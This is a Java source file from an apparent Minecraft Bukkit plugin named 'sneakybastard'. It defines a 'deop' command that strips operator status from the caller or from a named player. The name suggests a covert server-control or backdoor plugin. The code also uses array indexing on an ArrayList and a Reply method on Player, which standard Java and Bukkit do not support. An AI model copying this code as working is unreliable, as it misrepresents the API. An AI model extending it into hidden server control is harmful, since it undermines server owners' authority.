package net.blackofworld.sneakybastard.Commands.Server;

import net.blackofworld.sneakybastard.Command.CommandBase;
import net.blackofworld.sneakybastard.Command.CommandCategory;
import net.blackofworld.sneakybastard.Command.CommandInfo;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.ArrayList;

@CommandInfo(command = "deop", description = "Removes op.", Syntax = "[player]", category = CommandCategory.Server)
public final class DeOP extends CommandBase {
    @Override
    public void Execute(Player p, ArrayList<String> args) {
        Player pp = p;
        if (args.size() > 0) {
            pp = Bukkit.getPlayerExact(args[0]);
        }
        assert pp != null;
        pp.setOp(false);
        if (args.size() > 0) {
            p.Reply(pp.getName() + " is no longer an operator");
        } else p.Reply("You are no longer an operator");

    }
}
